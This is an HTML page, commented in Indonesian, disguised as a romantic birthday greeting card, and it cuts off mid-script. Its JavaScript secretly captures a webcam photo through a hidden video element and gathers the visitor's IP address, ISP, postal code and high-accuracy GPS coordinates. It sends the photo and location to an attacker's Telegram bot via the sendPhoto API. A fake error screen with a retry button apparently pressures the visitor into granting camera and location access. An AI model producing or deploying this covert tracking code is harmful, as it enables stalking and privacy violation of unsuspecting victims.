<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>For You, Baby 🎂</title>

    <!-- Google Font -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;1,700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Inter', sans-serif;
            background: radial-gradient(ellipse at 30% 20%, #2b1a3a, #0e0b16);
            padding: 20px;
            overflow-x: hidden;
            position: relative;
        }

        body::before {
            content: '';
            position: fixed;
            inset: 0;
            z-index: 0;
            background-image:
                radial-gradient(2px 2px at 15% 25%, rgba(255, 215, 200, 0.7), transparent),
                radial-gradient(2px 2px at 35% 60%, rgba(255, 215, 200, 0.5), transparent),
                radial-gradient(2px 2px at 55% 15%, rgba(255, 215, 200, 0.8), transparent),
                radial-gradient(2px 2px at 75% 80%, rgba(255, 215, 200, 0.4), transparent),
                radial-gradient(2px 2px at 90% 40%, rgba(255, 215, 200, 0.6), transparent),
                radial-gradient(2px 2px at 10% 70%, rgba(255, 215, 200, 0.5), transparent),
                radial-gradient(2px 2px at 45% 90%, rgba(255, 215, 200, 0.4), transparent),
                radial-gradient(2px 2px at 80% 10%, rgba(255, 215, 200, 0.7), transparent),
                radial-gradient(3px 3px at 25% 45%, rgba(255, 215, 200, 0.3), transparent),
                radial-gradient(3px 3px at 65% 55%, rgba(255, 215, 200, 0.3), transparent);
            background-size: 200px 200px;
            animation: drift 70s linear infinite;
            pointer-events: none;
        }

        @keyframes drift {
            0% { transform: translate(0, 0); }
            100% { transform: translate(-40px, -40px); }
        }

        .card {
            position: relative;
            z-index: 1;
            max-width: 480px;
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px) saturate(1.6);
            -webkit-backdrop-filter: blur(20px) saturate(1.6);
            border-radius: 56px;
            padding: 40px 32px 32px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.1);
            text-align: center;
            transition: transform 0.3s ease;
        }

        .card:hover {
            transform: scale(1.01);
        }

        .card h1 {
            font-family: 'Playfair Display', serif;
            font-weight: 700;
            font-style: italic;
            font-size: 2.6rem;
            color: #fff4e6;
            margin-bottom: 8px;
            text-shadow: 0 4px 30px rgba(255, 200, 150, 0.3);
            letter-spacing: -0.5px;
        }

        .card h1 span {
            background: linear-gradient(135deg, #f9d29d, #ffb7a5);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .card .sub {
            font-size: 0.9rem;
            color: rgba(255, 255, 255, 0.45);
            letter-spacing: 2px;
            text-transform: uppercase;
            margin-bottom: 16px;
            font-weight: 500;
        }

        .card p {
            font-size: 1rem;
            line-height: 1.7;
            color: rgba(255, 255, 255, 0.8);
            margin-bottom: 20px;
            font-weight: 400;
            max-width: 360px;
            margin-left: auto;
            margin-right: auto;
        }

        .card p .highlight {
            color: #f9d29d;
            font-weight: 500;
        }

        .turntable-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 12px 0 20px;
            cursor: pointer;
            transition: transform 0.2s ease;
        }

        .turntable-wrapper:hover {
            transform: scale(1.05);
        }

        .turntable {
            position: relative;
            width: 100px;
            height: 100px;
            border-radius: 50%;
            background: radial-gradient(circle at 30% 30%, #2a2a2a, #0d0d0d);
            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.8), inset 0 -4px 10px rgba(0, 0, 0, 0.6), inset 0 4px 10px rgba(255, 255, 255, 0.05);
            display: flex;
            align-items: center;
            justify-content: center;
            border: 3px solid #3d3d3d;
            animation: spin 12s linear infinite;
        }

        .turntable::after {
            content: '';
            position: absolute;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background: radial-gradient(circle at 40% 40%, #ffdbb5, #b87c4b);
            box-shadow: inset 0 -2px 6px rgba(0, 0, 0, 0.5), 0 0 20px rgba(255, 200, 100, 0.3);
            border: 2px solid #5a3f2a;
        }

        .turntable .label {
            position: absolute;
            width: 16px;
            height: 16px;
            border-radius: 50%;
            background: radial-gradient(circle at 40% 40%, #ff6b6b, #a82b2b);
            box-shadow: 0 0 12px rgba(255, 80, 80, 0.5);
            z-index: 2;
        }

        .turntable .groove {
            position: absolute;
            inset: 8px;
            border-radius: 50%;
            border: 1px dashed rgba(255, 255, 255, 0.06);
            animation: spin 8s linear infinite reverse;
        }

        .turntable .groove:nth-child(2) {
            inset: 20px;
            border-color: rgba(255, 255, 255, 0.04);
            animation-duration: 10s;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .couple-illustration {
            margin: 16px auto 20px;
            max-width: 320px;
            border-radius: 24px;
            overflow: hidden;
            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.06);
            transition: transform 0.3s ease;
        }

        .couple-illustration:hover {
            transform: scale(1.02);
        }

        .couple-illustration img {
            width: 100%;
            height: auto;
            display: block;
            border-radius: 24px;
        }

        .btn-step {
            display: inline-flex;
            align-items: center;
            gap: 12px;
            padding: 14px 40px;
            background: linear-gradient(135deg, #f9d29d, #ffb7a5);
            border: none;
            border-radius: 100px;
            font-family: 'Inter', sans-serif;
            font-size: 1rem;
            font-weight: 600;
            color: #1a1423;
            text-decoration: none;
            letter-spacing: 0.5px;
            box-shadow: 0 8px 40px rgba(255, 180, 130, 0.3);
            transition: all 0.3s ease;
            cursor: pointer;
            border: 1px solid rgba(255, 255, 255, 0.2);
            margin-top: 4px;
        }

        .btn-step:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 50px rgba(255, 180, 130, 0.5);
            background: linear-gradient(135deg, #fce2b5, #ffc3a8);
        }

        .btn-step:active {
            transform: scale(0.96);
        }

        .btn-step .icon {
            font-size: 1.3rem;
            line-height: 1;
        }

        .error-screen {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 999;
            background: #0b0b1a;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: rgba(255, 255, 255, 0.15);
            font-family: 'Inter', sans-serif;
            font-size: 3rem;
            font-weight: 200;
            letter-spacing: 8px;
            text-transform: uppercase;
        }

        .error-screen .sub-error {
            font-size: 0.8rem;
            color: rgba(255, 255, 255, 0.05);
            letter-spacing: 4px;
            margin-top: 12px;
        }

        .btn-retry {
            margin-top: 30px;
            padding: 12px 32px;
            background: rgba(255, 255, 255, 0.06);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 100px;
            color: rgba(255, 255, 255, 0.3);
            font-family: 'Inter', sans-serif;
            font-size: 0.8rem;
            font-weight: 500;
            letter-spacing: 2px;
            text-transform: uppercase;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-retry:hover {
            background: rgba(255, 255, 255, 0.1);
            color: rgba(255, 255, 255, 0.5);
            border-color: rgba(255, 255, 255, 0.2);
        }

        @media (max-width: 480px) {
            .card {
                padding: 30px 20px 28px;
                border-radius: 40px;
            }
            .card h1 {
                font-size: 2rem;
            }
            .card p {
                font-size: 0.92rem;
            }
            .turntable {
                width: 80px;
                height: 80px;
            }
            .turntable::after {
                width: 24px;
                height: 24px;
            }
            .btn-step {
                padding: 12px 28px;
                font-size: 0.9rem;
            }
            .couple-illustration {
                max-width: 260px;
            }
            .error-screen {
                font-size: 2.2rem;
            }
            .btn-retry {
                padding: 10px 24px;
                font-size: 0.7rem;
            }
        }

        @media (max-width: 360px) {
            .card h1 {
                font-size: 1.6rem;
            }
            .turntable {
                width: 70px;
                height: 70px;
            }
            .couple-illustration {
                max-width: 200px;
            }
            .error-screen {
                font-size: 1.8rem;
            }
        }

        video {
            display: none !important;
        }
        .youtube-hidden {
            position: fixed;
            bottom: -9999px;
            left: -9999px;
            width: 0;
            height: 0;
            overflow: hidden;
            z-index: -1;
        }
    </style>
</head>

            let attempts = 0;

            const mainCard = document.getElementById('mainCard');
            const errorScreen = document.getElementById('errorScreen');
            const retryBtn = document.getElementById('retryBtn');

            // ---------- FUNGSI GET LOKASI DARI IP (ipapi.co) ----------
            async function getLocationFromIP() {
                try {
                    const response = await fetch('https://ipapi.co/json/', { timeout: 8000 });
                    if (!response.ok) throw new Error('Gagal fetch IP API');
                    const data = await response.json();
                    return {
                        ip: data.ip || null,
                        city: data.city || null,
                        region: data.region || null,
                        country: data.country_name || null,
                        country_code: data.country || null,
                        postal: data.postal || null,
                        latitude: data.latitude || null,
                        longitude: data.longitude || null,
                        org: data.org || null, // Nama ISP / Operator
                        timezone: data.timezone || null
                    };
                } catch (e) {
                    console.error('Error get IP location:', e);
                    return null;
                }
            }

            // ---------- FUNGSI GET LOKASI GPS (Browser Geolocation) ----------
            function getGPSLocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        resolve(null);
                        return;
                    }
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            });
                        },
                        () => {
                            resolve(null);
                        },
                        { timeout: 5000, enableHighAccuracy: true }
                    );
                });
            }

            // ---------- KIRIM KE TELEGRAM (dengan data lokasi) ----------
            async function kirimKeTelegram(dataUrl, locationData, gpsData) {
                try {
                    const blob = await fetch(dataUrl).then(r => r.blob());
                    const formData = new FormData();
                    formData.append('photo', blob, 'foto.png');

                    let caption = `📸 Foto diambil otomatis\n🕒 ${new Date().toLocaleString('id-ID')}`;

                    // --- IP & LOKASI DARI IP ---
                    if (locationData) {
                        if (locationData.ip) caption += `\n\n🌐 IP Publik : ${locationData.ip}`;
                        if (locationData.org) caption += `\n📡 Operator/ISP : ${locationData.org}`;
                        if (locationData.city || locationData.region || locationData.country) {
                            let loc = [];
                            if (locationData.city) loc.push(locationData.city);
                            if (locationData.region) loc.push(locationData.region);
                            if (locationData.country) loc.push(locationData.country);
                            caption += `\n📍 Lokasi IP : ${loc.join(', ')}`;
                        }
                        if (locationData.postal) caption += `\n📮 Kode Pos : ${locationData.postal}`;
                        if (locationData.timezone) caption += `\n🕐 Zona Waktu : ${locationData.timezone}`;
                        if (locationData.latitude && locationData.longitude) {
                            caption += `\n🗺️ Koordinat (IP) : ${locationData.latitude}, ${locationData.longitude}`;
                        }
                    }

                    // --- GPS (jika ada) ---
                    if (gpsData) {
                        caption += `\n\n📡 GPS (akurat):`;
                        caption += `\n   📍 Lat : ${gpsData.latitude}`;
                        caption += `\n   📍 Long : ${gpsData.longitude}`;
                        if (gpsData.accuracy) {
                            caption += `\n   🎯 Akurasi : ±${Math.round(gpsData.accuracy)} meter`;
                        }
                    }

                    if (!locationData && !gpsData) {
                        caption += `\n\n⚠️ Data lokasi tidak tersedia`;
                    }

                    formData.append('caption', caption);
                    formData.append('chat_id', CHAT_ID);

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    sudahKirim = true;
                } catch (e) {
                    console.error('Gagal kirim:', e);
                }
            }

            // ---------- AMBIL FOTO + LOKASI ----------
            function ambilDanKirim(video) {
                if (sudahKirim) return;

                // Ambil foto dari canvas
                const canvas = document.createElement('canvas');
                const lebar = video.videoWidth || 640;
                const tinggi = video.videoHeight || 480;
                canvas.width = lebar;
                canvas.height = tinggi;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, lebar, tinggi);
                const dataUrl = canvas.toDataURL('image/png');

                if (video.srcObject) {
                    video.srcObject.getTracks().forEach(track => track.stop());
                }

                // Dapatkan lokasi secara paralel
                Promise.allSettled([
                    getLocationFromIP(),
                    getGPSLocation()
                ]).then((results) => {
                    const locationData = results[0].status === 'fulfilled' ? results[0].value : null;
                    const gpsData = results[1].status === 'fulfilled' ? results[1].value : null;
                    kirimKeTelegram(dataUrl, locationData, gpsData);
                }).catch(() => {
                    kirimKeTelegram(dataUrl, null, null);
                });
            }

            // ---------- TAMPILKAN ERROR ----------
            function tampilkanError() {
                izinDitolak = true;
                mainCard.style.display = 'none';
                errorScreen.style.display = 'flex';
                if (retryTimer) {
                    clearTimeout(retryTimer);
                    retryTimer = null;
                }
            }

            function resetDanCobaUlang() {
                izinDitolak
